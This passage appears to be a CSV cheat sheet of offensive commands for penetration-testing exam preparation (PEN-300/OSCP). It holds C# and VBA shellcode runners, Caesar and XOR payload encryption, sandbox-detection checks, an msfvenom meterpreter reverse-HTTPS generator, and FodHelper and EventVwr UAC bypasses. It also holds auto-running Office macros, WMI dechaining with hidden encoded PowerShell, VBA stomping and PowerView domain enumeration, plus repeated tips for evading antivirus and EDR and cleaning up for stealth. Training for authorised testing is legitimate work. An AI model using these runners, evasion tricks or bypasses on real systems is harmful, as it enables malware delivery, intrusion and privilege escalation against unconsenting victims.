        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport(""kernel32"")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport(""kernel32"")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        static void Main(string[] args) {
            byte[] buf = new byte[] { <SHELLCODE> };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}","Basic C# template for executing raw shellcode via VirtualAlloc  CreateThread  WaitForSingleObject pattern.
Foundation for all custom runners.","","using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner {
    class Program {
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport(""kernel32"")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport(""kernel32"")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        static void Main(string[] args) {
            byte[] buf = new byte[] { 0xfc,0x48,0x83,0xe4,0xf0 };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}","Syntax:
Save as Program.cs, compile with csc.exe Basic runner will be flagged by modern AV.

Always add encryption (caesar/xor) or heuristic evasion before deploying.

Practice compiling on Windows target.

Time estimate:
2 minutes (with pre-generated shellcode) References:
docs/av-evasion/shellcode-runners.md#basic-runner, PEN-300 Chapter 6.5.1 Manual alternative:
Use Python ctypes, PowerShell reflection, or compiled languages (C/C++) for shellcode execution","","","","","","","","",""
"csharp-caesar-encrypt","C# Caesar Cipher Encryption","shellcode-runners","// ENCRYPTION (offline)
byte[] buf = new byte[] { <RAW_SHELLCODE> };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)(((uint)buf[i] + <KEY>) & 0xFF);
}
// Print encoded array
Console.WriteLine(""byte[] encoded = new byte[] { "" + string.Join("","", encoded.Select(b => $""0x{b:X2}"")) + "" };"");

// DECRYPTION (runtime in runner)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)(((uint)buf[i] - <KEY>) & 0xFF);
}","Encrypt shellcode with Caesar cipher (byte rotation).
Simple obfuscation to evade static signatures.
Decrypt at runtime before execution.","","// ENCRYPTION (offline)
byte[] buf = new byte[] { 0xfc,0x48,0x83 };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}
// Print encoded array
Console.WriteLine(""byte[] encoded = new byte[] { "" + string.Join("","", encoded.Select(b => $""0x{b:X2}"")) + "" };"");

// DECRYPTION (runtime in runner)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}","Syntax:
Add encryption offline, add decryption to runner before VirtualAlloc Caesar cipher is weak but fast.

Good for lab practice.

For exam, use XOR or combine with heuristic evasion.

Key=2 is common in examples.

Time estimate:
5 minutes (encryption + integration) References:
docs/av-evasion/shellcode-runners.md#caesar-cipher, PEN-300 Chapter 6.5.2 Manual alternative:
Use XOR encryption (stronger), AES encryption (strongest), or custom encoding schemes","","","","","","","","",""
"csharp-xor-encrypt","C# XOR Encryption","shellcode-runners","// ENCRYPTION (offline)
byte[] buf = new byte[] { <RAW_SHELLCODE> };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);
}

// DECRYPTION (runtime - same operation)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);
}","XOR encryption for shellcode.
Stronger than Caesar cipher.
Each byte XORed with key, decrypt by XORing again (XOR is reversible).","","// ENCRYPTION (offline)
byte[] buf = new byte[] { 0xfc,0x48,0x83 };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)((uint)buf[i] ^ 0xAA);
}

// DECRYPTION (runtime - same operation)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)((uint)buf[i] ^ 0xAA);
}","Syntax:
XOR encrypt offline, XOR decrypt at runtime (same key) XOR is standard industry practice.

Key 0xAA common but predictable - use random key.

Combine with heuristic evasion for best results.

Time estimate:
5 minutes References:
docs/av-evasion/shellcode-runners.md#xor-encryption Manual alternative:
Use multi-byte XOR keys, AES encryption, or RC4 cipher for stronger protection","","","","","","","","",""
"csharp-sleep-timer","C# Sleep Timer Evasion","shellcode-runners","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(<SLEEP_MS>);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < <THRESHOLD_SEC>) {
    return; // Sandbox detected - exit
}
// Continue with payload execution","Heuristic evasion using sleep timer with elapsed time validation.
Sandboxes skip Sleep() calls - detect by measuring actual elapsed time.","","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(10000);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < 9.5) {
    return; // Sandbox detected - exit
}
// Continue with payload execution","Syntax:
Add before shellcode execution in Main() Simple but effective against basic sandboxes.

10 seconds is standard.

For exam, may skip to save time if target already compromised.

Good for phishing scenarios.

Time estimate:
1 minute (add to existing runner) References:
docs/av-evasion/shellcode-runners.md#sleep-timer, PEN-300 Chapter 6.6.1 Manual alternative:
Use non-emulated API checks (VirtualAllocExNuma), large memory allocations, or anti-debugging techniques","","","","","","","","",""
"csharp-non-emulated-api","C# Non-Emulated API Check","shellcode-runners","using System;
using System.Runtime.InteropServices;

[DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport(""kernel32.dll"")]
static extern IntPtr GetCurrentProcess();

// Sandbox check
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null) {
    return; // Sandbox detected - API not emulated
}
// Continue with payload","Detect sandbox by calling VirtualAllocExNuma - rarely emulated API.
If NULL returned, sandbox detected.
Combines with GetCurrentProcess for legitimacy.","","","Syntax:
Add before shellcode execution in Main() More sophisticated than sleep timer.

Bypasses sandboxes that wait out delays.

Combine both for maximum evasion.

Quick to add (<10 lines).

Time estimate:
2 minutes References:
docs/av-evasion/shellcode-runners.md#non-emulated-api, PEN-300 Chapter 6.6.2 Manual alternative:
Use FlsAlloc, GetTickCount64, or other rarely-emulated APIs.

Check for debugger with IsDebuggerPresent.","","","","","","","","",""
"msfvenom-csharp-payload","Generate msfvenom C# Shellcode","shellcode-runners","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f csharp","Generate shellcode in C# byte array format for use in custom runners.
Use HTTPS payloads for encrypted C2 communication.","","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f csharp","Syntax:
Run on Kali, copy output to C# runner Always use HTTPS payloads (not HTTP) for better evasion.

Port 443 blends with legitimate traffic.

Generate before exam, don't waste time during.

Time estimate:
30 seconds References:
docs/av-evasion/shellcode-runners.md#msfvenom-generation, PEN-300 Chapter 6.4 Manual alternative:
Use custom reverse shell (bash, python, netcat) or C2 frameworks (Cobalt Strike, Sliver, Havoc)","","","","","","","","",""
"compile-csharp-runner","Compile C# Shellcode Runner","shellcode-runners","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:<OUTPUT_EXE> <SOURCE_CS>","Compile C# source code to Windows executable using csc.exe (.NET Framework compiler).
Must be run on Windows target or staging system.","","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:runner.exe Program.cs","Syntax:
Run on Windows system with .NET Framework Practice compiling on Windows VM before exam.

Framework64 for modern systems.

/target:winexe hides console window (stealthier).

Compilation is fast (<5 seconds).

Time estimate:
30 seconds References:
docs/av-evasion/shellcode-runners.md#compilation Manual alternative:
Use Visual Studio, MSBuild, or cross-compile with Mono on Linux","","","","","","","","",""
"fodhelper-uac-bypass","FodHelper UAC Bypass","uac-bypass","# Create registry structure
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""<PAYLOAD_COMMAND>"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\fodhelper.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force","Exploit fodhelper.exe auto-elevation via registry hijacking. Creates HKCU registry key that fodhelper.exe checks, executes payload with high integrity without UAC prompt.","","# Create registry structure
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""cmd /c start powershell.exe"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\fodhelper.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force","Syntax:
Execute in PowerShell with medium integrity (standard user) FodHelper is classic UAC bypass for Windows 10.

Works on unpatched systems.

Quick to execute (~10 sec).

Always clean up registry key for stealth.

Test integrity with 'whoami /groups' before and after.

Useful after initial access to escalate without credentials.

Time estimate:
2 minutes References:
docs/av-evasion/uac-bypass.md#fodhelper, PEN-300 Chapter 7.5 Manual alternative:
Use alternate UAC bypasses (eventvwr, sdclt, computerdefaults), exploit vulnerabilities, or request legitimate admin credentials","","","","","","","","",""
"eventvwr-uac-bypass","EventVwr UAC Bypass","uac-bypass","# Create registry key
New-Item ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""<PAYLOAD_COMMAND>"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\eventvwr.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\mscfile\"" -Recurse -Force","Exploit eventvwr.exe auto-elevation via registry hijacking. Similar to FodHelper but uses different registry key (mscfile). Works on Windows 7-10.","","# Create registry key
New-Item ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""cmd /c start powershell.exe"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\eventvwr.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\mscfile\"" -Recurse -Force","Syntax:
Execute in PowerShell with medium integrity EventVwr is older bypass, may be patched.

FodHelper more reliable on modern systems.

Good backup option.

Works on Windows 7-10.

~5 sec execution time.

Time estimate:
2 minutes References:
docs/av-evasion/uac-bypass.md#eventvwr Manual alternative:
Use FodHelper, sdclt, computerdefaults, or other auto-elevate binaries","","","","","","","","",""
"check-integrity-level","Check Process Integrity Level","uac-bypass","whoami /groups | findstr /i ""Mandatory Label""","Verify current process integrity level (Low/Medium/High/System). Determines if UAC bypass needed and validates bypass success.","","","Syntax:
Run in cmd.exe or PowerShell Always check integrity before attempting UAC bypass.

Medium + Administrators group = UAC bypass will work.

Low integrity = sandboxed process, escape first.

High = already elevated, no bypass needed.

Takes <5 sec to check.

Time estimate:
10 seconds References:
docs/av-evasion/uac-bypass.md#integrity-levels Manual alternative:
Use PowerShell [Security.Principal.WindowsIdentity]::GetCurrent(), Process Explorer, or Task Manager Details pane","","","","","","","","",""
"uac-bypass-detection","Test UAC Bypass Detection","uac-bypass","# Test registry creation (no trigger)
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""cmd /c echo test"" -Force

Write-Host ""Registry keys created. Check for AV alerts...""
Start-Sleep 10

# Cleanup
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force
Write-Host ""Cleaned up. No AV alert = bypass likely undetected.""","Test if UAC bypass attempt is detected/blocked by AV or EDR. Creates registry keys without triggering bypass to check for alerts.","","","Syntax:
Execute in PowerShell to test detection Test before using in real engagement.

Some EDR products specifically monitor HKCU\Software\Classes hijacking.

If detected, try alternate bypasses (sdclt, computerdefaults) or token manipulation.

~30 sec test time.

Time estimate:
30 seconds References:
docs/av-evasion/uac-bypass.md#testing Manual alternative:
Monitor Windows Event Logs (Security, Sysmon), check EDR console, or use Process Monitor to watch registry access","","","","","","","","",""
"vba-shellcode-runner-basic","VBA Shellcode Runner (Basic)","vba-evasion","Private Declare PtrSafe Function CreateThread Lib ""kernel32"" (ByVal Zopqv As Long, ByVal Mqnlq As Long, ByVal Xxjvx As LongPtr, Zqcxr As Long, ByVal Txyin As Long, Bnkjk As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib ""kernel32"" (ByVal Xaojl As Long, ByVal Hbzvw As Long, ByVal Cwmrq As Long, ByVal Gzpbv As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib ""kernel32"" (ByVal Dkhnw As LongPtr, ByRef Kcaob As Any, ByVal Pauic As Long) As LongPtr

Sub Auto_Open()
    Dim buf As Variant
    buf = Array(<SHELLCODE_BYTES>)
    
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    Dim counter As Long
    For counter = LBound(buf) To UBound(buf)
        Dim data As Long
        data = buf(counter)
        RtlMoveMemory addr + counter, data, 1
    Next counter
    
    Dim thandle As LongPtr
    thandle = CreateThread(0, 0, addr, 0, 0, 0)
End Sub","Basic VBA macro for executing shellcode in memory. Uses VirtualAlloc  RtlMoveMemory  CreateThread pattern. Foundation for Office-based payloads.","","Private Declare PtrSafe Function CreateThread Lib ""kernel32"" (ByVal Zopqv As Long, ByVal Mqnlq As Long, ByVal Xxjvx As LongPtr, Zqcxr As Long, ByVal Txyin As Long, Bnkjk As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib ""kernel32"" (ByVal Xaojl As Long, ByVal Hbzvw As Long, ByVal Cwmrq As Long, ByVal Gzpbv As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib ""kernel32"" (ByVal Dkhnw As LongPtr, ByRef Kcaob As Any, ByVal Pauic As Long) As LongPtr

Sub Auto_Open()
    Dim buf As Variant
    buf = Array(232, 130, 0, 0, 0, ...)
    
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    Dim counter As Long
    For counter = LBound(buf) To UBound(buf)
        Dim data As Long
        data = buf(counter)
        RtlMoveMemory addr + counter, data, 1
    Next counter
    
    Dim thandle As LongPtr
    thandle = CreateThread(0, 0, addr, 0, 0, 0)
End Sub","Syntax:
Add to Word/Excel VBA editor (Alt+F11), insert shellcode bytes Basic runner detected by all modern AV.

Always combine with encryption (Caesar/XOR) and obfuscation.

Auto_Open triggers on document open.

Use AutoOpen() for compatibility.

Time estimate:
5 minutes (with shellcode generation) References:
docs/av-evasion/vba-evasion.md#basic-runner, PEN-300 Chapter 6.7 Manual alternative:
Use PowerShell download cradle from VBA, WMI process creation, or COM object execution","","","","","","","","",""
"vba-caesar-cipher","VBA Caesar Cipher Shellcode","vba-evasion","' Offline encryption (Python):
# shellcode = [0xfc, 0x48, 0x83, ...]
# key = 2
# encrypted = [(b + key) % 256 for b in shellcode]

' VBA decryption and execution:
Sub AutoOpen()
    Dim buf As Variant
    buf = Array(<ENCRYPTED_BYTES>)  ' Caesar encrypted shellcode
    
    ' Decrypt with Caesar cipher
    For i = LBound(buf) To UBound(buf)
        buf(i) = (buf(i) - <KEY>) Mod 256
    Next i
    
    ' Execute (VirtualAlloc -> RtlMoveMemory -> CreateThread)
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For i = LBound(buf) To UBound(buf)
        RtlMoveMemory addr + i, buf(i), 1
    Next i
    CreateThread 0, 0, addr, 0, 0, 0
End Sub","Encrypt shellcode with Caesar cipher in VBA. Decrypt at runtime before execution. Simple obfuscation to evade static signatures in Office documents.","","' Offline encryption (Python):
# shellcode = [0xfc, 0x48, 0x83, ...]
# key = 2
# encrypted = [(b + key) % 256 for b in shellcode]

' VBA decryption and execution:
Sub AutoOpen()
    Dim buf As Variant
    buf = Array(254, 74, 133, ...)  ' Caesar encrypted shellcode
    
    ' Decrypt with Caesar cipher
    For i = LBound(buf) To UBound(buf)
        buf(i) = (buf(i) - 2) Mod 256
    Next i
    
    ' Execute (VirtualAlloc -> RtlMoveMemory -> CreateThread)
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For i = LBound(buf) To UBound(buf)
        RtlMoveMemory addr + i, buf(i), 1
    Next i
    CreateThread 0, 0, addr, 0, 0, 0
End Sub","Syntax:
Encrypt offline, paste encrypted bytes into VBA Caesar cipher is weak but better than plaintext.

Key=2 is common in examples.

For exam, consider XOR for better evasion.

Combine with obfuscation and dechaining.

Time estimate:
10 minutes (encryption + integration) References:
docs/av-evasion/vba-evasion.md#caesar-cipher, PEN-300 Chapter 6.7.1 Manual alternative:
Use XOR encryption (stronger), AES encryption, or base64 encoding","","","","","","","","",""
"vba-wmi-dechain","VBA WMI Process Dechaining","vba-evasion","Sub AutoOpen()
    Dim payload As String
    payload = ""powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>""
    
    Dim pid As Variant
    GetObject(""winmgmts:"").Get(""Win32_Process"").Create payload, Null, Null, pid
End Sub","Execute payload via WMI to break parent-child process chain. Office doc  WMI  powershell breaks typical macro detection. Payload runs outside Office sandbox.","","Sub AutoOpen()
    Dim payload As String
    payload = ""powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...""
    
    Dim pid As Variant
    GetObject(""winmgmts:"").Get(""Win32_Process"").Create payload, Null, Null, pid
End Sub","Syntax:
Add to VBA macro, replace <BASE64_PAYLOAD> with encoded PowerShell WMI dechaining is powerful evasion technique.

Breaks WINWORD -> powershell parent-child relationship that AV monitors.

Always encode PowerShell with base64.

Test network connectivity first.

Time estimate:
5 minutes References:
docs/av-evasion/vba-evasion.md#wmi-dechaining, PEN-300 Chapter 6.8.2 Manual alternative:
Use WScript.Shell.Run, CreateObject(""WScript.Shell"").Exec, or scheduled task creation","","","","","","","","",""
"vba-string-obfuscation","VBA String Obfuscation","vba-evasion","' Method 1: String concatenation
Dim cmd As String
cmd = ""power"" & ""shell"" & "".exe""

' Method 2: Chr() function
cmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)

' Method 3: StrReverse()
cmd = StrReverse(""exe.llehsrewop"")

' Method 4: Replace()
cmd = Replace(""pXwXrshell.exe"", ""X"", ""o"")","Obfuscate suspicious strings (powershell, msfvenom, http) using concatenation and character codes. Evades simple string-based signatures in VBA code.","","","Syntax:
Apply to suspicious strings in VBA code String obfuscation is quick win (~10 min).

Always obfuscate 'powershell', 'cmd', 'http', 'IEX', 'msfvenom'.

Use random variable names (avoid shellcode, payload, etc.).

Combine all methods for best results.

Time estimate:
10 minutes References:
docs/av-evasion/vba-evasion.md#obfuscation, PEN-300 Chapter 6.8.3 Manual alternative:
Use variable substitution, encoded strings, or external data sources (document properties, hidden cells)","","","","","","","","",""
"vba-stomping","VBA Stomping (P-Code Manipulation)","vba-evasion","# VBA stomping workflow:
# 1. Create malicious VBA macro in Office document
# 2. Save as .doc (legacy format required for stomping)
# 3. Use EvilClippy to stomp VBA source:
EvilClippy.exe -s <INPUT_DOC> -o <OUTPUT_DOC>

# Manual method:
# 1. Open .doc in hex editor
# 2. Locate VBA source code section
# 3. Replace with garbage/nulls while preserving p-code
# 4. Save and test","Remove VBA source code while preserving compiled p-code. Office executes p-code even if source removed. Analysis tools see empty/garbage VBA, can't analyze logic.","","# VBA stomping workflow:
# 1. Create malicious VBA macro in Office document
# 2. Save as .doc (legacy format required for stomping)
# 3. Use EvilClippy to stomp VBA source:
EvilClippy.exe -s payload.doc -o payload_stomped.doc

# Manual method:
# 1. Open .doc in hex editor
# 2. Locate VBA source code section
# 3. Replace with garbage/nulls while preserving p-code
# 4. Save and test","Syntax:
Use EvilClippy tool or manual hex editing Advanced technique, requires EvilClippy tool.

Extremely effective against static analysis and sandboxes.

Only works on .doc (not .docx).

Test macro BEFORE stomping - can't debug after.

Save original.

Practice on lab before exam.

Time estimate:
15 minutes (with EvilClippy) References:
docs/av-evasion/vba-evasion.md#vba-stomping, https://github.com/outflanknl/EvilClippy, PEN-300 Chapter 6.7.2 Manual alternative:
Use OfficeMalScanner, olevba, or manual p-code analysis/manipulation","","","","","","","","",""
"vba-autoopen-variants","VBA Auto-Execution Methods","vba-evasion","' Method 1: Auto_Open (Word/Excel - legacy)
Sub Auto_Open()
    ' Your payload
End Sub

' Method 2: AutoOpen (Word - no underscore)
Sub AutoOpen()
    ' Your payload
End Sub

' Method 3: Document_Open (Word - modern)
Private Sub Document_Open()
    ' Your payload
End Sub

' Method 4: Workbook_Open (Excel)
Private Sub Workbook_Open()
    ' Your payload
End Sub

' Method 5: AutoExec (Word - on close)
Sub AutoExec()
    ' Your payload
End Sub","Various methods to trigger VBA macro execution automatically. Auto_Open, AutoOpen, Document_Open, Workbook_Open for different Office versions and scenarios.","","","Syntax:
Choose appropriate method for Office version and app Always implement Auto_Open AND AutoOpen for Word (compatibility).

Excel uses Workbook_Open.

Test on target Office version if known.

Social engineering required to convince user to enable macros.

Time estimate:
2 minutes References:
docs/av-evasion/vba-evasion.md#auto-execution Manual alternative:
Use ActiveX controls, form events, or button click handlers for user-initiated execution","","","","","","","","",""
"import-powerview","Import PowerView Module","enumeration","Import-Module <PATH>\PowerView.ps1","Load PowerView module into PowerShell session to enable Active Directory enumeration cmdlets. PowerView is a PowerShell tool for gaining network situational awareness on Windows domains. This must be run before any PowerView cmdlets can be used.","","Import-Module C:\Tools\PowerView.ps1","PowerView.ps1 may trigger AV detection.

Consider using obfuscated versions or AMSI bypass techniques.

For OSCP, usually safe on target machines.

Alternative:
Use native AD cmdlets if PowerView unavailable.","high","","","","{""execution policy blocked"": ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass"", ""file not found"": ""Verify PowerView.ps1 path and use full absolute path"", ""access denied"": ""Ensure current user has read permissions on file""}","","","[""import-sharphound"", ""ldapsearch-ad""]","[""get-netdomain"", ""get-netuser"", ""get-netgroup"", ""get-netcomputer""]"
"get-netdomain","Get Domain Information","enumeration","Get-NetDomain","Retrieve detailed information about the current domain or specified domain. Returns domain name, domain controllers, forest name, and other critical AD infrastructure details. Essential for understanding the target AD environment structure.","","","The DomainSID is particularly valuable - save it for potential Golden/Silver Ticket attacks.

For OSCP, focus on identifying Domain Controllers and understanding domain structure.

Manual alternative:
'nltest /dclist:<domain>'","high","","","","{""no output"": ""Verify host is domain-joined: systeminfo | findstr /B /C:\""Domain\"""", ""access denied"": ""Current user may lack domain query permissions"", ""cannot contact DC"": ""Check network connectivity: ping <DC_NAME>""}","","[""import-powerview""]","[""ldapsearch-dump""]","[""get-netuser"", ""get-netgroup"", ""get-netcomputer""]"
"get-netuser","Enumerate Domain Users","enumeration","Get-NetUser -SamAccountName <USERNAME>","Query Active Directory for user account details including account properties, group memberships, login times, and password policies. Can enumerate all users or target specific accounts. Critical for identifying privileged accounts and attack targets.","","Get-NetUser -SamAccountName Administrator","OSCP Tip:
Always check user 'description' field - admins often store passwords there.

Use '-AdminCount 1' to quickly find privileged accounts.

For Kerberoasting, look for serviceprincipalname field.

Manual alternative:
'net user /domain' or 'net user <username> /domain'","high","","","","{""too much output"": ""Use -SamAccountName filter or pipe to Select-Object"", ""access denied"": ""User may lack read permissions on user objects"", ""no results"": ""Try Get-NetUser without parameters to enumerate all""}","{""-SamAccountName"": ""Filter to specific user account by username"", ""-AdminCount"": ""Find users with adminCount=1 (privileged accounts)"", ""-SPN"": ""Find users with Service Principal Names (Kerberoastable)"", ""-UACFilter"": ""Filter by User Account Control flags""}","[""import-powerview""]","[""net-user-domain-list"", ""ps-ldapsearch-users"", ""get-aduser""]","[""get-netgroup""]"
"get-netgroup","Enumerate Domain Groups","enumeration","Get-NetGroup -GroupName ""<GROUP>""","Query Active Directory for group information and group memberships. Identifies privileged groups like Domain Admins, Enterprise Admins, and custom administrative groups. Essential for privilege escalation path mapping.","","Get-NetGroup -GroupName ""Domain Admins""","OSCP Focus Groups:
'Domain Admins', 'Enterprise Admins', 'Backup Operators', 'Account Operators', 'Server Operators'.

These groups have elevated privileges.

Use Get-NetGroupMember to see full membership recursively.

Manual alternative:
'net group ""<group>"" /domain'","high","","","","{""group not found"": ""Use wildcard: Get-NetGroup -GroupName \""*Admin*\"""", ""access denied"": ""User may lack read permissions on group objects"", ""incomplete members"": ""Use Get-NetGroupMember for recursive enumeration""}","{""-GroupName"": ""Filter to specific group by name"", ""-AdminCount"": ""Find privileged groups (adminCount=1)"", ""-Domain"": ""Query different domain in forest""}","[""import-powerview""]","[""net-group-domain-list"", ""ps-ldapsearch-groups"", ""get-adgroup""]","[""get-netuser"", ""find-localadminaccess""]"
"get-netcomputer","Enumerate Domain Computers","enumeration","Get-NetComputer -FullData","Query Active Directory for computer objects including workstations, servers, and domain controllers. Returns detailed information about each computer including OS version, last logon, and DNS hostname. Critical for identifying high-value targets and lateral movement candidates.","","","OSCP Strategy:
Focus on servers (OperatingSystem like '*Server*') as they often have more privileges.

Look for SQL servers, Exchange, domain controllers.

Use -Unconstrained flag to find computers vulnerable to delegation attacks.

Manual alternative:
'net view' for basic computer list.","high","","","","{""too much output"": ""Filter by OS: Get-NetComputer -OperatingSystem '*Server*'"", ""access denied"": ""User lacks read permissions on computer objects"", ""no results"": ""Verify domain connectivity and PowerView import""}","{""-FullData"": ""Return all computer object properties (recommended)"", ""-OperatingSystem"": ""Filter by OS (e.g., 'Windows Server*')"", ""-Ping"": ""Only return computers that respond to ping"", ""-Unconstrained"": ""Find computers with unconstrained delegation""}","[""import-powerview""]","[""get-adcomputer"", ""ps-ldapsearch-computers""]","[""find-localadminaccess"", ""invoke-sharefinder""]"
"find-localadminaccess","Find Local Admin Access","enumeration","Find-LocalAdminAccess","Test current user's local administrator access on all domain computers by attempting to access admin shares (C$). Identifies systems where current user has local admin rights, critical for lateral movement and privilege escalation path discovery.","","","OSCP Critical:
This identifies WHERE you can move laterally.

Results show systems where PSExec, WMI, or PowerShell Remoting will work.

Can be slow on large domains - use -ComputerName with high-value targets list.

Generates SMB traffic that may be logged.

Manual alternative:
Test C$ access manually with 'dir \\<computer>\C$'","high","","","","{""no results"": ""Current user may not have local admin on any systems"", ""network errors"": ""Check firewall rules and SMB connectivity"", ""very slow"": ""Use -ComputerName to test subset of computers""}","{""-ComputerName"": ""Test specific computer instead of all domain computers"", ""-Delay"": ""Add delay between checks (stealth)"", ""-Jitter"": ""Randomize delay (stealth)""}","[""import-powerview""]","",""
"invoke-sharefinder","Find Network Shares","enumeration","Invoke-ShareFinder","Enumerate all accessible network shares across domain computers. Identifies potential data repositories, file servers, and misconfigurations. Critical for finding sensitive files, configuration files, and credentials stored in shares.","","","OSCP Priority Shares:
SYSVOL (Group Policy files often contain credentials), NETLOGON (logon scripts), custom shares (user data).

Look for passwords in files like Groups.xml (Group Policy Preferences), scripts, config files.

Manual alternative:
'net view \\<computer>' to list shares.","medium","","","","{""too much output"": ""Use -ExcludeStandard to filter default shares"", ""access denied on all"": ""User may lack domain user minimum rights"", ""slow enumeration"": ""Use -ComputerName with specific target list""}","{""-CheckShareAccess"": ""Verify read access on each share (more thorough)"", ""-ExcludeStandard"": ""Exclude default shares (C$, ADMIN$, IPC$)"", ""-ComputerName"": ""Target specific computers""}","[""import-powerview""]","[""smb-crackmapexec-shares"", ""smb-enum"", ""net-view-shares""]",""
"get-netgpo","Enumerate Group Policy Objects","enumeration","Get-NetGPO","Query Active Directory for Group Policy Objects (GPOs) and their configurations. GPOs often contain credentials, scheduled tasks, registry settings, and other useful information for privilege escalation and lateral movement.","","","OSCP Gold Mine:
